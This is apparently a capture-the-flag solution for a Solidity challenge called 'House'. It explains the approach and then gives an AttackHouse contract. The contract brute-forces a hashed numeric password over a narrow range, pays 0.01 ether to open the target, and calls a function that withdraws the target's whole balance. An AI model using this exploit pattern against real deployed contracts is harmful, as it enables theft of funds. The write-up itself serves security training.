# House

## Solution

To validate this challenge, we need to read the variable containing the amount of ethers to send and read the variable containing the encrypted password.
Afterwards, it's necessary to find the good password by making a brute force in order to find the equivalent password to the encrypted one.

```sol
// SPDX-License-Identifier: MIT

pragma solidity ^0.6.0;

import "../../levels/hardChalls/House.sol";

contract AttackHouse {
    House originalContract;
    bytes32 password = 0x53d560affeeaf017bf120737c84cae3735e76d2108ce3cb65997cec3eddd36ce;

    constructor(address payable _originalContract) public {
        originalContract = House(_originalContract);
    }

    function findPassword() private view returns (uint) {
        for (uint i = 8500; i < 9000; i++) {
            if (password == keccak256(abi.encodePacked(i)))
                return i;
        }
        revert("Not found");
    }

    function exploit() public payable {
        require (msg.value == 0.01 ether);
        address(originalContract).call.value(0.01 ether)(abi.encodeWithSignature("openTheHouse(uint256)", findPassword()));
        address(originalContract).call(abi.encodeWithSignature("youCanWithdrawAllTheBalance(address payable)", payable(address(this))));
    }

}
```